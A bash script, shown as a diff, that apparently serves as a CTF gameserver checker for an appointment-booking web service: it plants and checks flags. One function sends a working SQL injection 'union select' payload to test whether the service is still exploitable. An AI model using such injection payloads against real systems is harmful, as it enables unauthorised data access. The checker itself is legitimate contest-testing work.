@@ -1,0 +1,83 @@
+#!/bin/bash
+
+#$1 URL
+function FindFreeSlot(){
+    url=${1}
+    monday=$(date -d "Monday 08:00" +"%s")
+    one_hour=$((60*60))
+    one_week=$((one_hour*24*7))
+    one_day=$((one_hour*24))
+    again=1
+    while test $again -eq 1; do
+        next_monday=$((monday+one_week));
+        week_data=$(curl -s "${url}/weekdata?begin=${monday}&end=${next_monday}" | grep timestamp | sed 's/.*<timestamp>\(.*\)<\/timestamp>/\1/g')
+        if ! test $? -eq 0; then
+            exit 1
+        fi
+        #For each day of this week
+        for (( day = 0; $day < 6 && $again; day=$((day+1)) )); do
+            current_day=$((monday+day*one_day))
+            #For each hour of this day
+            for (( hour = 0; $hour < 9 && $again; hour=$((hour+1)) )); do
+                current_time=$((current_day+hour*one_hour))
+                if ! ( echo $week_data | grep $current_time >/dev/null ); then
+                    echo $current_time
+                    again=0
+                fi
+            done
+        done
+        monday=$next_monday
+    done
+}
+
+#$1 URL
+#$2 Flag name
+#$3 Flag data
+function PlantFlag(){
+    url=${1}
+    name=${2}
+    data=${3}
+    free=$(FindFreeSlot ${url})
+    curl -sf "${url}/makeappointment?time=${free}&user=${name}&pass=${data}"|grep timestamp>/dev/null 2>&1
+}
+
+#$1 URL
+#$2 Flag name
+#$3 Flag data
+function CheckFlag(){
+    url=${1}
+    name=${2}
+    data=${3}
+    curl -sf "${url}/listmyappointments?time=0&user=${name}&pass=${data}" | grep timestamp >/dev/null 2>&1
+}
+
+#$1 URL
+function Exploitable(){
+    url=${1}
+    curl -sf "${url}/listmyappointments?time=0&user=bogus&pass=bogus'%20and%201=2%20union%20select%201,1,1,concat(char(51),char(120),char(80),char(49),char(48),char(105),char(116),char(52),char(98),char(49),char(51)),'1" 2>&1 | grep 3xP10it4b13 >/dev/null
+}
+
+function Help(){
+    echo "Usage: ${0} -p <url> <flagname> <flagdata>"
+    echo "       ${0} -c <url> <flagname> <flagdata>"
+    echo "       ${0} -e <url>"
+    echo ""
+    echo "  -p  Plant flag"
+    echo "  -c  Check flag"
+    echo "  -e  Check exploitability"
+}
+
+case $1 in
+    "-p")
+        PlantFlag $2 $3 $4
+        ;;
+    "-c")
+        CheckFlag $2 $3 $4
+        ;;
+    "-e")
+        Exploitable $2
+        ;;
+     *)
+        Help
+        ;;
+esac
